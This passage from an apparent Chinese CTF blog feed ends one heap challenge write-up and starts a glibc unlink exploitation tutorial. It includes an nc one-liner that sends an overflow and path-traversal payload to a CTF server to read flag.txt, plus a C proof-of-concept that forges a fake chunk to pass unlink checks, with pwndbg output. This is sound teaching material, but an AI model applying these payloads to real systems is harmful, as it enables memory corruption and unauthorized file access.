class="line">0x6030d0:0x00000000006030600x0000000000000031</span><br><span class="line">0x6030e0:0x00000000006030940x0000000000000004</span><br><span class="line">0x6030f0:0x00000000006030900x0000000000000008</span><br><span class="line">0x603100:0x00000000006030b00x0000000000000021</span><br><span class="line">0x603110:0x00000000000000000x0000000000000000</span><br><span class="line">0x603120:0x00000000000000000x0000000000000031</span><br><span class="line">0x603130:0x00000000006031100x0000000000000003</span><br><span class="line">0x603140:0x00000000006031100x0000000000000008</span><br><span class="line">0x603150:0x00000000006030e00x0000000000000031</span><br><span class="line">0x603160:0x00000000006031140x0000000000000004</span><br><span class="line">0x603170:0x00000000006031100x0000000000000008</span><br><span class="line">0x603180:0x00000000006031300x0000000000000021</span><br><span class="line">0x603190:0x00000000006030000x0000000000000000</span><br><span class="line">0x6031a0:0x00000000000000000x0000000000020e61</span><br><span class="line">0x6031b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6031c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6031d0:0x00000000000000000x0000000000000000</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x /x 0x00000000006020B8</span><br><span class="line">0x6020b8:0x0000000000603160</span><br></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li>read_int(sub_400A40)中输入48个字符时，结果不会以null结尾，从而允许leak stack。</li><li>删除一个句子（通过搜索找到它之后）会删除句子内容并释放该句子，但不会删除指向该句子的词语。这会造成UAF(可以通过打印输出来泄漏信息）和一个double free。<h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2>writeup<br><a href="https://github.com/pwning/public-writeup/tree/master/9447ctf2015/pwn230-search" target="_blank" rel="noopener">https://github.com/pwning/public-writeup/tree/master/9447ctf2015/pwn230-search</a></li></ol><p>##<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMBP:~$ python -c &apos;print &quot;kaiokenx20\x00&quot;+&quot;A&quot;*5+&quot;././././././././././././././flag.txt\x00\n&quot;+&quot;123&quot;&apos;|nc 128.199.224.175 13000</span><br><span class="line">Enter password to authentic yourself : Enter case number:</span><br><span class="line"></span><br><span class="line"> 1) Application_1</span><br><span class="line"> 2) Application_2</span><br><span class="line"> 3) Application_3</span><br><span class="line"> 4) Application_4</span><br><span class="line"> 5) Application_5</span><br><span class="line"> 6) Application_6</span><br><span class="line"> 7) Flag</span><br><span class="line"></span><br><span class="line"> Enter choice :-</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line"></span><br><span class="line">The flag is :- pctf&#123;bUff3r-0v3Rfl0wS`4r3.alw4ys-4_cl4SsiC&#125;</span><br><span class="line">��</span><br><span class="line"></span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-05-070951.png" alt=""></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 堆利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastbin </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CTF pwn中的unlink</title>
      <link href="/2018/03/01/unlink1/"/>
      <url>/2018/03/01/unlink1/</url>
      <content type="html"><![CDATA[<h2 id="unlink简介"><a href="#unlink简介" class="headerlink" title="unlink简介"></a>unlink简介</h2><p>unlink的目的是把一个双向链表中的空闲块拿出来，如图。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-28-131218.jpg" alt=""><br>也就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">设置 P-&gt;fd-&gt;bk = P-&gt;bk.</span><br><span class="line">设置 P-&gt;bk-&gt;fd = P-&gt;fd.</span><br></pre></td></tr></table></figure></p><h2 id="unlink时执行的检查"><a href="#unlink时执行的检查" class="headerlink" title="unlink时执行的检查"></a>unlink时执行的检查</h2><p>以前的unlink是没有检查的，很容易利用，不过现在多了两项检查，所以在利用时候要绕过这些检查。</p><table><thead><tr><th>Function</th><th style="text-align:right">Security Check</th><th style="text-align:center">Error</th></tr></thead><tbody><tr><td>unlink</td><td style="text-align:right">chunk size是否等于next chunk(内存意义上的)的prev_size</td><td style="text-align:center">corrupted size vs. prev_size</td></tr><tr><td>unlink</td><td style="text-align:right">检查是否P-&gt;fd-&gt;bk == P 以及 P-&gt;bk-&gt;fd == P</td><td style="text-align:center">corrupted double-linked list</td></tr></tbody></table><h2 id="unlink-exploit"><a href="#unlink-exploit" class="headerlink" title="unlink exploit"></a>unlink exploit</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>通过一个例子来学习一下，这个例子是<a href="https://heap-exploitation.dhavalkapil.com" target="_blank" rel="noopener">Heap Exploitation系列</a>的unlink，为了便于理解，我会用gdb详细的调试一下。<br>首先，编译程序,我使用的系统是ubuntu14.04 64位，将下面的示例代码编译出来，带上-g参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ gcc -g unlink.c -o unlink</span><br><span class="line">unlink.c: In function ‘main’:</span><br><span class="line">unlink.c:46:3: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘long long unsigned int’ [-Wformat=]</span><br><span class="line">   printf(&quot;%x\n&quot;, chunk1[3]);</span><br><span class="line">   ^</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> &#123;</span></span><br><span class="line">  <span class="keyword">size_t</span> prev_size;</span><br><span class="line">  <span class="keyword">size_t</span> size;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">fd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">bk</span>;</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">10</span>];               <span class="comment">// padding</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *chunk1, *chunk2;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">fake_chunk</span>, *<span class="title">chunk2_hdr</span>;</span></span><br><span class="line">  <span class="keyword">char</span> data[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// First grab two chunks (non fast)</span></span><br><span class="line">  chunk1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">  chunk2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;chunk1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, chunk1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, chunk2);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Assuming attacker has control over chunk1's contents</span></span><br><span class="line">  <span class="comment">// Overflow the heap, override chunk2's header</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// First forge a fake chunk starting at chunk1</span></span><br><span class="line">  <span class="comment">// Need to setup fd and bk pointers to pass the unlink security check</span></span><br><span class="line">  fake_chunk = (struct chunk_structure *)chunk1;</span><br><span class="line">  fake_chunk-&gt;fd = (struct chunk_structure *)(&amp;chunk1 - <span class="number">3</span>); <span class="comment">// Ensures P-&gt;fd-&gt;bk == P</span></span><br><span class="line">  fake_chunk-&gt;bk = (struct chunk_structure *)(&amp;chunk1 - <span class="number">2</span>); <span class="comment">// Ensures P-&gt;bk-&gt;fd == P</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Next modify the header of chunk2 to pass all security checks</span></span><br><span class="line">  chunk2_hdr = (struct chunk_structure *)(chunk2 - <span class="number">2</span>);</span><br><span class="line">  chunk2_hdr-&gt;prev_size = <span class="number">0x80</span>;  <span class="comment">// chunk1's data region size</span></span><br><span class="line">  chunk2_hdr-&gt;size &amp;= ~<span class="number">1</span>;        <span class="comment">// Unsetting prev_in_use bit</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'</span></span><br><span class="line">  <span class="comment">// This results in chunk1 pointer pointing to chunk1 - 3</span></span><br><span class="line">  <span class="comment">// i.e. chunk1[3] now contains chunk1 itself.</span></span><br><span class="line">  <span class="comment">// We then make chunk1 point to some victim's data</span></span><br><span class="line">  <span class="built_in">free</span>(chunk2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, chunk1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, chunk1[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">  chunk1[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)data;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(data, <span class="string">"Victim's data"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Overwrite victim's data using chunk1</span></span><br><span class="line">  chunk1[<span class="number">0</span>] = <span class="number">0x002164656b636168</span>LL;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, data);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我使用了一个gdb插件pwndbg(应该是插件吧？)，需要安装的话。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure></p><p>开始调试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b 20</span><br><span class="line">Breakpoint 1 at 0x400695: file unlink.c, line 20.</span><br><span class="line">pwndbg&gt; r</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-28-173449.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; n</span><br></pre></td></tr></table></figure></p><p>这样就开始malloc第一个chunk了，返回的地址放在rax里，然后存到栈里。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-28-173700.png" alt=""><br>继续看第二个chunk的地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; n</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-28-173806.png" alt=""><br>接下来的三条命令其实就是输出我们刚刚调试出来的chunk地址的，所以过掉就行了，不过可以检查一下我们找的是不是对的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b 25</span><br><span class="line">Breakpoint 2 at 0x4006f3: file unlink.c, line 25.</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">0x7fffffffdd60</span><br><span class="line">0x602010</span><br><span class="line">0x6020a0</span><br></pre></td></tr></table></figure></p><p>然后来详细的说明一下，是怎么unlink exploit的。<br>假设攻击者已经控制了chunk1的数据，并且可以溢出到chunk2的元数据。<br>因为我们能够控制chunk1的数据，所以当然可以在chunk1里伪造一个chunk出来。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk = (struct chunk_structure *)chunk1;</span><br></pre></td></tr></table></figure></p><p>我们知道，返回给我们的chunk实际上是mem指针,<strong>如下图的mem就是chunk1</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-092353.jpg" alt=""><br>通过将chunk1强制转换为struct chunk_structure结构体，就伪造出了一个chunk。<br>相当于<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-28-135600.jpg" alt=""><br>然后我们看一下此时的chunk1的内存。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x602010</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p><p>再看一下fake_chunk,地址为0xffffcf80，指向0x0804b008（mem)<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-28-174334.png" alt=""><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p $rbp<span class="number">-0x40</span></span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">void</span> *) <span class="number">0x7fffffffdd70</span></span><br><span class="line">pwndbg&gt; x /x <span class="number">0x7fffffffdd70</span></span><br><span class="line"><span class="number">0x7fffffffdd70</span>:<span class="number">0x0000000000602010</span></span><br></pre></td></tr></table></figure></p><h3 id="通过检查点1"><a href="#通过检查点1" class="headerlink" title="通过检查点1"></a>通过检查点1</h3><p><strong>接下来要确保chunk-&gt;fd-&gt;bk == chunk</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk-&gt;fd = (struct chunk_structure *)(&amp;chunk1 - <span class="number">3</span>); <span class="comment">// Ensures P-&gt;fd-&gt;bk == P</span></span><br></pre></td></tr></table></figure></p><p>如果不熟悉指针加减运算的，可以参考<a href="http://c.biancheng.net/cpp/biancheng/view/47.html" target="_blank" rel="noopener">这篇文章</a><br>&amp;chunk1是指存放chunk1这个被分配出来的heap的地址的<strong>栈地址</strong>,即0x7fffffffdd60<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 10</span><br><span class="line">00:0000│ rsp  0x7fffffffdd60 —▸ 0x602010 ◂— 0x0</span><br><span class="line">01:0008│      0x7fffffffdd68 —▸ 0x6020a0 ◂— 0x0</span><br><span class="line">02:0010│      0x7fffffffdd70 —▸ 0x602010 ◂— 0x0</span><br><span class="line">03:0018│      0x7fffffffdd78 —▸ 0x40084d (__libc_csu_init+77) ◂— add    rbx, 1</span><br><span class="line">04:0020│      0x7fffffffdd80 —▸ 0x7fffffffddb0 ◂— 0x0</span><br><span class="line">05:0028│      0x7fffffffdd88 ◂— 0x0</span><br><span class="line">06:0030│      0x7fffffffdd90 —▸ 0x400800 (__libc_csu_init) ◂— push   r15</span><br><span class="line">07:0038│      0x7fffffffdd98 ◂— 0xb7dbaa1d9dced400</span><br><span class="line">08:0040│      0x7fffffffdda0 —▸ 0x7fffffffde90 ◂— 0x1</span><br><span class="line">09:0048│      0x7fffffffdda8 ◂— 0x0</span><br></pre></td></tr></table></figure></p><p>此时的chunk1<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x602010</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:<span class="number">0x00007fffffffdd48</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p><p><strong>接下来要确保chunk-&gt;bk-&gt;fd == chunk</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk-&gt;bk = (struct chunk_structure *)(&amp;chunk1 - <span class="number">2</span>); <span class="comment">// Ensures P-&gt;bk-&gt;fd == P</span></span><br></pre></td></tr></table></figure></p><p>此时的chunk1<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x602010</span>:<span class="number">0x0000000000000000</span>&lt;=fake_chunk(mem)<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:<span class="number">0x00007fffffffdd48</span>&lt;=fake_chunk-&gt;fd<span class="number">0x00007fffffffdd50</span>&lt;=fake_chunk-&gt;bk</span><br><span class="line"><span class="number">0x602030</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p><p>我相信到这个时候你已经凌乱了,因为我一开始看到这里的时候也挺凌乱的（因为我指针学的不好emmm..)<br>让我们再理一下。</p><p>首先观察一下栈段，我们知道我们的变量都是存在栈上的,chunk1,fake_chunk都是指针,指针的值都是一个表示地址空间中某个存储器单元的整数,这也就是我们说的<strong>指向</strong>。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *chunk1, *chunk2;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">fake_chunk</span>, *<span class="title">chunk2_hdr</span>;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">10</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffdd60</span> —▸ <span class="number">0x602010</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffdd68</span> —▸ <span class="number">0x6020a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffdd70</span> —▸ <span class="number">0x602010</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffdd78</span> —▸ <span class="number">0x40084d</span> (__libc_csu_init+<span class="number">77</span>) ◂— add    rbx, <span class="number">1</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffdd80</span> —▸ <span class="number">0x7fffffffddb0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffdd88</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffdd90</span> —▸ <span class="number">0x400800</span> (__libc_csu_init) ◂— push   r15</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffdd98</span> ◂— <span class="number">0xb7dbaa1d9dced400</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│      <span class="number">0x7fffffffdda0</span> —▸ <span class="number">0x7fffffffde90</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│      <span class="number">0x7fffffffdda8</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>chunk1=0x602010<br>&amp;chunk1=0x7fffffffdd60</p><p>fake_chunk=0x602010<br>&amp;fake_chunk=0x7fffffffdd70</p><p>然后我们再看一下fake_chunk-&gt;fd，和fake_chunk_bk的值是多少。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x602010</span>:<span class="number">0x0000000000000000</span>&lt;=fake_chunk(mem)<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:<span class="number">0x00007fffffffdd48</span>&lt;=fake_chunk-&gt;fd<span class="number">0x00007fffffffdd50</span>&lt;=fake_chunk-&gt;bk</span><br><span class="line"><span class="number">0x602030</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p><p>fake_chunk-&gt;fd=0x00007fffffffdd48<br>fake_chunk-&gt;bk=0x00007fffffffdd50</p><p>需要知道的是，fd和bk的类型同样是struct chunk_structure <em>，也就是说fake-&gt;chunk-&gt;fd/bk指向的内存也是”<em>*结构体</em></em>“<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">fd</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">bk</span>;</span></span><br></pre></td></tr></table></figure></p><p>所以这个指向的”结构体”是这样的。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x00007fffffffdd48</span></span><br><span class="line"><span class="number">0x7fffffffdd48</span>:<span class="number">0x00007ffff7ffe1c8</span>-&gt;prev_size<span class="number">0x0000000000000003</span>-&gt;size</span><br><span class="line"><span class="number">0x7fffffffdd58</span>:<span class="number">0x00000000004006f3</span>-&gt;fd<span class="number">0x0000000000602010</span>-&gt;bk</span><br><span class="line"></span><br><span class="line"><span class="number">0x7fffffffdd68</span>:<span class="number">0x00000000006020a0</span><span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7fffffffdd78</span>:<span class="number">0x000000000040084d</span><span class="number">0x00007fffffffddb0</span></span><br><span class="line"><span class="number">0x7fffffffdd88</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000400800</span></span><br></pre></td></tr></table></figure></p><p>所以fake_chunk-&gt;fd-&gt;bk=0x0000000000602010=chunk1<br>而我们知道fake_chunk=chunk1。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk = (struct chunk_structure *)chunk1;</span><br></pre></td></tr></table></figure></p><p><strong>所以这样就过了chunk-&gt;fd-&gt;bk==chunk的检查</strong><br><strong>chunk-&gt;bk-&gt;fd == chunk也是同理的</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-28-144600.png" alt=""></p><h3 id="通过检查点2"><a href="#通过检查点2" class="headerlink" title="通过检查点2"></a>通过检查点2</h3><p>然后为了通过检查点<code>chunk size是否等于next chunk(内存意义上的)的prev_size</code>,我们需要修改chunk2的prev_size<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chunk2_hdr = (struct chunk_structure *)(chunk2 - <span class="number">2</span>);</span><br><span class="line">chunk2_hdr-&gt;prev_size = <span class="number">0x80</span>;  <span class="comment">// chunk1's data region size</span></span><br><span class="line">chunk2_hdr-&gt;size &amp;= ~<span class="number">1</span>;        <span class="comment">// Unsetting prev_in_use bit</span></span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x602090</span></span><br><span class="line"><span class="number">0x602090</span>:<span class="number">0x0000000000000080</span><span class="number">0x0000000000000090</span></span><br><span class="line"><span class="number">0x6020a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span 